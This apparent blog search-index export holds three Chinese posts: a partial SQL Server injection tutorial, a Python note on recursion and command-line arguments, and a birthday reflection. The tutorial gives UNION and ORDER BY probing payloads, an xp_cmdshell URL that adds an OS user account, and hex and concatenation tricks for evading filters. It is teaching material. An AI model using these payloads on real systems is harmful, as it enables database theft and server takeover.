mssql">&#x2F;&#x2F;正常语句select id,username,password from users where id&#x3D;1&#x2F;&#x2F;不断增加 ORDER BY 后面的列标号select id,username,password from users where id&#x3D;1 order by 1select id,username,password from users where id&#x3D;1 order by 2select id,username,password from users where id&#x3D;1 order by 3......</code></pre><p>假设 users 表共有三列，则当 order by 4 时就会报错：</p><p><strong>“ORDER BY 位置号 4 超出了选择列表中项数的范围”</strong></p><h4 id="UNION-查询"><a href="#UNION-查询" class="headerlink" title="UNION 查询"></a>UNION 查询</h4><p>UNION 查询要遵循两个基本规则：</p><ul><li>所有查询中列数必须相同</li><li>数据类型必须兼容</li></ul><h5 id="union-查询探测列数"><a href="#union-查询探测列数" class="headerlink" title="union 查询探测列数"></a>union 查询探测列数</h5><p>除了用 order by 语句推断列数外，还可以使用 union 查询：</p><pre><code class="hljs mssql">&#x2F;&#x2F;正常语句select id,username,password from users where id&#x3D;1&#x2F;&#x2F;不断增加ORDER BY后面的列标号select id,username,password from users where id&#x3D;1 union select nullselect id,username,password from users where id&#x3D;1 union select null,nullselect id,username,password from users where id&#x3D;1 union select null,null,null......</code></pre><p>若 null 的数量与表中字段数不同，则会报错：<br><strong>“使用 UNION、INTERSECT 或 EXCEPT 运算符合并的所有查询必须在其目标列表中有相同数目的表达式”</strong></p><ul><li><p><code>union select null,null,...</code> 和 <code>union select 1,2,3</code>  的区别：</p><p>null和其他任何数据类型都不会发生不兼容的情况，而数字型与其他类型（例如字符串）就会出现不兼容，因此推荐使用 null ；是否会出现类型异常也与数据库种类有关，MySQL中使用1,2,3…就不会出现异常，而 Oracle 和 SQL Server 则相反。</p></li></ul><h5 id="union-查询敏感信息"><a href="#union-查询敏感信息" class="headerlink" title="union 查询敏感信息"></a>union 查询敏感信息</h5><p>假设已得知列数为 4，可以使用如下语句注入：</p><pre><code class="hljs mssql">......id&#x3D;1 union select &#39;x&#39;,null,null,null from sysobjects where xtype&#x3D;&#39;U&#39;</code></pre><p>如果第一行数据类型不匹配，数据库将会报错，可递归查询直至语句正常执行：</p><pre><code class="hljs mssql">......id&#x3D;1 union select null,&#39;x&#39;,null,null from sysobjects where xtype&#x3D;&#39;U&#39;......id&#x3D;1 union select null,null,&#39;x&#39;,null from sysobjects where xtype&#x3D;&#39;U&#39;......</code></pre><p>语句执行正常，代表数据类型兼容，就可以将 x 换为 SQL 语句，查询敏感信息。</p><h4 id="利用系统函数"><a href="#利用系统函数" class="headerlink" title="利用系统函数"></a>利用系统函数</h4><p>所有的数据库系统都会提供很多内置的系统函数，这些函数中有些可以直接返回数据库名、用户名等敏感信息，有些可以对数据进行处理（例如：字符串连接、截取；ASCII码转换等）。这些系统函数为 SQL 注入提供了很大的便利。</p><p>SQL Server 中的常用函数表如下：</p><table><thead><tr><th align="center">函 数</th><th align="center">说 明</th></tr></thead><tbody><tr><td align="center">suser_name()</td><td align="center">返回用户的登录标识名</td></tr><tr><td align="center">user_name()</td><td align="center">基于指定的标识号返回数据库用户名</td></tr><tr><td align="center">db_name()</td><td align="center">返回数据库名称</td></tr><tr><td align="center">is_number(‘db_owner’)</td><td align="center">是否为数据库角色</td></tr><tr><td align="center">convert(int,’5’)</td><td align="center">数据类型转换</td></tr><tr><td align="center">stuff()</td><td align="center">字符串截取</td></tr><tr><td align="center">ascii()</td><td align="center">取ASCII码</td></tr><tr><td align="center">char()</td><td align="center">根据ASCII码取字符</td></tr><tr><td align="center">getdate()</td><td align="center">返回日期</td></tr><tr><td align="center">count()</td><td align="center">返回组中总条数</td></tr><tr><td align="center">cast()</td><td align="center">将一种数据类型的表达式显式转换为另一种数据类型</td></tr><tr><td align="center">rand()</td><td align="center">返回随机值</td></tr><tr><td align="center">is_srvrolemember()</td><td align="center">指定 SQL Server 登录名是否为指定服务器角色的成员</td></tr></tbody></table><h4 id="利用存储过程"><a href="#利用存储过程" class="headerlink" title="利用存储过程"></a>利用存储过程</h4><p>存储过程（Stored Procedure）是在大型数据库系统中为完成特定功能的一组 SQL 语句集，存储在数据库中，经过第一次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。</p><p>常见的存储过程功能有：执行系统命令、查看注册表、读取磁盘目录等。</p><p>攻击者最常用的存储过程是 <code>xp_cmdshell</code> ,允许用户执行操作系统命令，例如：</p><pre><code class="hljs mssql">http:&#x2F;&#x2F;www.secbug.org&#x2F;test.aspx?id&#x3D;1;exec xp_cmdshell &#39;net user test test &#x2F;add&#39;</code></pre><p>使用存储过程，必须先拥有相应的权限。</p><h4 id="动态执行"><a href="#动态执行" class="headerlink" title="动态执行"></a>动态执行</h4><p>SQL Server 支持动态执行语句，用户可以提交一个字符串来执行 SQL 语句，例如：</p><pre><code class="hljs mssql">exec(&#39;select username,password from users&#39;)&#x2F;&#x2F;绕过关键词过滤exec(&#39;selec&#39;+&#39;t userneme,password fro&#39;+&#39;m users&#39;)</code></pre><p>可以通过定义十六进制的SQL语句，使用 exec 函数执行，可以绕过对单引号的过滤机制：</p><pre><code class="hljs mssql">declare @query varchar(888)select @query&#x3D;0x73656C6563742031exec(@query)&#x2F;&#x2F;以上命令连接起来declare&#x2F;**&#x2F;@query&#x2F;**&#x2F;varchar(888)&#x2F;**&#x2F;select&#x2F;**&#x2F;@query&#x3D;0x73656C6563742031&#x2F;**&#x2F;exec(@query)</code></pre><p>（有待更多补充和实践）</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>由汉诺塔想到的</title>
    <link href="/2017/09/10/%E7%94%B1%E6%B1%89%E8%AF%BA%E5%A1%94%E6%83%B3%E5%88%B0%E7%9A%84/"/>
    <url>/2017/09/10/%E7%94%B1%E6%B1%89%E8%AF%BA%E5%A1%94%E6%83%B3%E5%88%B0%E7%9A%84/</url>
    
    <content type="html"><![CDATA[<p>回顾一下Python基础知识，发现自己基础掌握得实在是差，甚至都不敢说自己会用Python了。想想两年也看了不少书，究其原因还是练习太少吧。不每天写写代码是学不会programming的。</p><a id="more"></a><p>进入正题，一个简单的Hanoi Tower递归：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move</span><span class="hljs-params">(n,a=<span class="hljs-string">'A'</span>,b=<span class="hljs-string">'B'</span>,c=<span class="hljs-string">'C'</span>)</span>:</span><span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span>:print(a,<span class="hljs-string">"--&gt;"</span>,c)<span class="hljs-keyword">else</span> :move(n<span class="hljs-number">-1</span>,a,c,b)print(a,<span class="hljs-string">"--&gt;"</span>,c)move(n<span class="hljs-number">-1</span>,b,a,c)</code></pre><p>主要理解分治思想和递归思想的运用吧，这个倒没什么问题，接下来就暴露基础不扎实了：</p><ul><li><p>用命令行执行脚本的程序入口在哪？</p><ul><li>可以自己定义一个main函数：</li></ul><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move</span><span class="hljs-params">(n,a=<span class="hljs-string">'A'</span>,b=<span class="hljs-string">'B'</span>,c=<span class="hljs-string">'C'</span>)</span>:</span>…………<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>  move(<span class="hljs-number">3</span>)  main()</code></pre><ul><li>但在很多脚本中常见的是这样：</li></ul><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move</span><span class="hljs-params">(n,a=<span class="hljs-string">'A'</span>,b=<span class="hljs-string">'B'</span>,c=<span class="hljs-string">'C'</span>)</span>:</span>…………<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:  move(<span class="hljs-number">3</span>)</code></pre><p>那么<code>if __name__ == &#39;__main__&#39;:</code>的作用是什么呢？</p><p>简单来讲就是直接运行脚本时，一个变量 __name__ 被赋值为 __main__ ；而当该脚本作为module被其他程序import时，__name__ 则被赋值为该脚本名称。</p><p>也就是说，在 <code>if __name__ == &#39;__main__&#39;:</code>后面的代码，直接运行脚本时会被执行，而当脚本作为module时不会执行。</p><p>Stackoverflow上有一个回答很直观易懂，摘录部分如下：</p><pre><code class="hljs python"><span class="hljs-comment"># file one.py</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">()</span>:</span>    print(<span class="hljs-string">"func() in one.py"</span>)print(<span class="hljs-string">"top-level in one.py"</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    print(<span class="hljs-string">"one.py is being run directly"</span>)<span class="hljs-keyword">else</span>:    print(<span class="hljs-string">"one.py is being imported into another module"</span>)    <span class="hljs-comment"># file two.py</span><span class="hljs-keyword">import</span> oneprint(<span class="hljs-string">"top-level in two.py"</span>)one.func()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    print(<span class="hljs-string">"two.py is being run directly"</span>)<span class="hljs-keyword">else</span>:    print(<span class="hljs-string">"two.py is being imported into another module"</span>)</code></pre></li></ul><ul><li><p>如何读取命令行参数？</p><p>想在命令行中以参数形式输入汉诺塔层数，却发现忘了命令行参数怎么用了……真是羞耻，重新总结一下。</p><ul><li><p>最简单的方法：<strong>sys.argv</strong></p><p>sys.argv 就是命令行参数列表了，其中第一个参数argv[0]是脚本名，后面依次是输入的参数。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">print</span> <span class="hljs-string">'参数个数:'</span>, len(sys.argv)<span class="hljs-keyword">print</span> <span class="hljs-string">'参数列表:'</span>, str(sys.argv)</code></pre></li><li><p>进阶方法：<strong>getopt</strong>模块</p><p>在使用很多程序时，都遇到过输入类似“-a”、“-h”、“–help”之类的选项来实现不同功能。设置这种命令行选项在Python中可以通过getopt模块来实现。</p><p>getopt模块是专门处理命令行参数的模块，用于获取命令行选项和参数，也就是sys.argv。命令行选项使得程序的参数更加灵活。支持短选项模式（-）和长选项模式（–）。</p><p>该模块提供了两个方法及一个异常处理来解析命令行参数。</p><p>常用的方法是getopt方法：</p><pre><code class="hljs python">getopt.getopt(args, options[, long_options])</code></pre><p>参数说明：</p><ul><li><strong>args</strong>: 要解析的命令行参数列表。</li><li><strong>options</strong>: 以列表的格式定义，<strong>options</strong>后的冒号(:)表示该选项必须有附加的参数，不带冒号表示该选项不附加参数。</li><li><strong>long_options</strong>: 以字符串的格式定义，<strong>long_options</strong> 后的等号(=)表示如果设置该选项，必须有附加的参数，否则就不附加参数。</li><li>该方法返回值由两个元素组成: 第一个是 <strong>(option, value)</strong> 元组的列表。 第二个是参数列表，包含那些没有’-‘或’–’的参数。</li></ul><p>先把网上的一个实例贴过来吧，有机会再自己写应用该模块的程序。</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><span class="hljs-keyword">import</span> sys, getopt<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(argv)</span>:</span>   inputfile = <span class="hljs-string">''</span>   outputfile = <span class="hljs-string">''</span>   <span class="hljs-keyword">try</span>:      opts, args = getopt.getopt(argv,<span class="hljs-string">"hi:o:"</span>,[<span class="hljs-string">"ifile="</span>,<span class="hljs-string">"ofile="</span>])   <span class="hljs-keyword">except</span> getopt.GetoptError:      <span class="hljs-keyword">print</span> <span class="hljs-string">'test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;'</span>      sys.exit(<span class="hljs-number">2</span>)   <span class="hljs-keyword">for</span> opt, arg <span class="hljs-keyword">in</span> opts:      <span class="hljs-keyword">if</span> opt == <span class="hljs-string">'-h'</span>:         <span class="hljs-keyword">print</span> <span class="hljs-string">'test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;'</span>         sys.exit()      <span class="hljs-keyword">elif</span> opt <span class="hljs-keyword">in</span> (<span class="hljs-string">"-i"</span>, <span class="hljs-string">"--ifile"</span>):         inputfile = arg      <span class="hljs-keyword">elif</span> opt <span class="hljs-keyword">in</span> (<span class="hljs-string">"-o"</span>, <span class="hljs-string">"--ofile"</span>):         outputfile = arg   <span class="hljs-keyword">print</span> <span class="hljs-string">'输入的文件为：'</span>, inputfile   <span class="hljs-keyword">print</span> <span class="hljs-string">'输出的文件为：'</span>, outputfile<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:   main(sys.argv[<span class="hljs-number">1</span>:])</code></pre><p>运行该脚本：</p><pre><code class="hljs python">$ python test.py -husage: test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;$ python test.py -i inputfile -o outputfile输入的文件为： inputfile输出的文件为： outputfile</code></pre></li></ul></li></ul><p>还是希望自己要多想多做，脚踏实地，慢慢来。</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>弱冠之年</title>
    <link href="/2017/07/21/%E5%BC%B1%E5%86%A0%E4%B9%8B%E5%B9%B4/"/>
    <url>/2017/07/21/%E5%BC%B1%E5%86%A0%E4%B9%8B%E5%B9%B4/</url>
    
    <content type="html"><![CDATA[<p>男子二十，冠而字。</p><p><strong>《礼记·曲礼》</strong></p><p>​    二十岁的生日，又没有在家里度过。</p><a id="more"></a><p>​    小时候，年年都是父母陪着过生日。当时情形大抵是记不得的，只是从老照片上看到，每年都要去达活泉坐一次碰碰车，和那块刻着“天趣”的石头合个影比比高低。</p><p>​    后来的生日大都草草，能记在心上的几次都是在外地。十六岁躺在岳麓山脚下的小旅馆，满心欢喜地看着有人为我在零点发微博祝福（没错那个时候流行的社交软件居然是腾讯微博）。十七岁鏖战在笃行楼的自习室里，关心国初显然胜过关心生日。</p><p>​    现在我安逸地坐在武汉的酒店房间，比起四年前三人和蟑螂挤两张小床的待遇好了不知多少，回味着晚上吃的饭和白天搭的站，心里还是有点小满足感的。</p><p>​    其实总也没感觉长大，但不爱旅游的我却也不知不觉“闯荡”了好几座城市了，小时候在家门口都分不清东西南北，现在独身一人在陌生城市横冲直撞也没有半点胆怯了。其实我还是分不清东西南北，只不过仗着有gps也就无所畏惧，所以还是要感谢飞速发展的科学技术感谢……等等，跑题了，说生日呢快拉回来。</p><p>​    古代的男子二十岁，就该束发加冠，起表字，正式成为能承担社会责任的成年人。现在想想也一样吧，即使还能在象牙塔里待个四五年，二十岁也已经处在该承担起责任的边缘了，不光是对自己负责，也要考虑未来对家庭的责任了。</p><p>​    二十岁之前的几年，自感生活不能说一直走下坡路，但也是没什么向上的趋势的。有很多宝贵的时间被蹉跎，很多机会也没能抓住。自己还是有很多缺点，身体不好成日困倦却又不能坚持锻炼，自诩有理想有上进心又总是输给懒惰和拖延症。其实也是知道如果这么下去，是成不了自己向往的样子的。</p><p>​    所以即使时常立Flag又时常食言，还是想在二十岁的第一天提醒一下自己啊。希望能脚踏实地，不要好高骛远，眼高手低；希望能持之以恒，不要半途而废，立志如放屁；希望能打开心门，不要自卑、自负和故步自封。</p><p>​    这个历尽波折仓促完成的博客就送给自己当礼物吧，以后慢慢去完善它。让它见证我的积累和改变。</p><p>​    向前走，就这么走，就算你被给过什么。</p><p>​    向前走，就这么走，就算你被夺走什么。</p><p>​    向前走，就这么走，就算你会错过什么。</p><p>​    向前走吧，尽力走好每一步，毕竟未来不只是为了自己啊。</p><p>​    </p><p>PS： 呼还好赶在生日的尾巴弄好了博客，算是圆了一个心愿。</p><p>​     可惜辣鸡腾讯云域名还要审核实名认证才能解析，只好先临时凑合一下了。</p><p>​     感谢一起来武汉的dalao们提供技术滋瓷和听我发了两天的牢骚2333。</p><p>​     晚安，世界。</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
